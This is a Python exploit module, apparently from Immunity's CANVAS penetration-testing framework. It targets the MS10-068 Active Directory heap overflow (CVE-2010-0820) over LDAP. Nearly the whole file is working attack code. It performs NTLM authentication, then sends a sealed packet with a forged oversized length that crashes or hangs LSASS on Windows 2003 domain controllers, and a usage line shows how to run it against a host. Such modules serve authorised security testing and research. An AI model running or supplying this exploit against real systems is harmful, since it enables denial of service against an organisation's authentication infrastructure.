#!/usr/bin/env python
##ImmunityHeader v1 
###############################################################################
## File       :  ms10_068.py
## Description:  
##            :  
## Created_On :  Thu Sep 16 14:17:03 2010
## Created_By :  Kostya Kortchinsky
## Modified_On:  Fri Sep 17 14:16:53 2010
## Modified_By:  Kostya Kortchinsky
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
###############################################################################

import os
import getopt
import sys
import socket
import time
import struct
import random

if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from tcpexploit import tcpexploit
from MOSDEF import mosdef
from libs.newsmb.libntlm import NTLM

NAME='Microsoft Active Directory Heap Overflow'
DESCRIPTION='Microsoft Active Directory Heap Overflow (MS10-068)'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Date public']='09/14/10'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/bulletin/ms10-068.mspx'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name']='CVE-2010-0820'
DOCUMENTATION['CVE Url']='http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0820'
DOCUMENTATION['CVSS']=0.0
DOCUMENTATION['Notes']=''

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='DoS'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2003']
PROPERTY['MSADV']='MS10-068'

NOTES="""
Usage:
./exploits/ms10_068/ms10_068.py -v 1 -t 192.168.2.20 -U kostya -P password
"""

CHANGELOG="""
"""

targets = {
    0:['Autoversioning'],
    }

def asn1len(s):
    if len(s)<0x80:
        return struct.pack('>B',len(s))
    #elif len(s)<0x100:
    #    return struct.pack('>BB',0x81,len(s))
    elif len(s)<0x10000:
        return struct.pack('>BH',0x82,len(s))
    else:
        return struct.pack('>BL',0x84,len(s))

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.host=''
        self.port=389
        self.needsNoShellcode=1
        self.version=0
        return

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def neededListenerTypes(self):
        return []

    def getArgs(self):
        self.host=self.target.interface
        self.port=self.argsDict.get('port',self.port)
        self.version=self.argsDict.get('version', self.version)
        self.user=self.argsDict.get('user',self.user)
        self.password=self.argsDict.get('password',self.password)
        return

    def test(self):
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to %s:%s'%(self.host,self.port))
            return 0
        return 1

    def run(self):
        self.getArgs()
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to %s:%s'%(self.host,self.port))
            return 0
        ntlm=NTLM(self.user,self.password)
        packet=ntlm.negotiate() #Integrity and Confidentiality default to True
        packet=struct.pack('>BB',0x04,0x0a)+'GSS-SPNEGO'+struct.pack('>B',0x04)+asn1len(packet)+packet
        packet=struct.pack('>BBBBBBBL',0x02,0x01,0x03,0x04,0x00,0xa3,0x84,len(packet))+packet
        packet=struct.pack('>BBBBBL',0x02,0x01,0x03,0x60,0x84,len(packet))+packet
        packet=struct.pack('>BBL',0x30,0x84,len(packet))+packet
        s.send(packet)
        data=s.recv(1024)
        i=data.find('NTLMSSP')
        if i==-1:
            self.log('NTLMSSP negotiate failed.')
            return 0
        ntlm.challenge(data[i:])

        packet=ntlm.authenticate()
        packet=struct.pack('>BB',0x04,0x0a)+'GSS-SPNEGO'+struct.pack('>B',0x04)+asn1len(packet)+packet
        packet=struct.pack('>BBBBBBBL',0x02,0x01,0x03,0x04,0x00,0xa3,0x84,len(packet))+packet
        packet=struct.pack('>BBBBBL',0x02,0x01,0x04,0x60,0x84,len(packet))+packet
        packet=struct.pack('>BBL',0x30,0x84,len(packet))+packet
        s.send(packet)
        data=s.recv(1024)
        if data.find('error')!=-1:
            self.log('NTLMSSP authenticate failed.')
            return 0

        data='A'*0x200 #it's only taking 0x100 bytes into account when we put the overflowing length anyway
        sealed_data=ntlm.SEAL(data)
        size=0xfffffffc #len(data)+0x10
        packet=struct.pack('>L',size)+ntlm.MAC(data)+sealed_data
        s.send(packet)
        time.sleep(1)
        try:
            data=s.recv(1024)
        except timeoutsocket.Timeout:
            self.log('Timeout on recv(), LSASS most likely crashed. Aborting.')
        s.close()
        self.setProgress(100)
        self.log('The target LSASS should be either dead or using 100% CPU or still up :(')
        return 0

    def usage(self):
        print 'Usage: %s -t host [-p port] -U user -P password'%(sys.argv[0])
        self.displayVersions()
        
if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None] and hasattr(ret,'interact'):
        ret.interact()
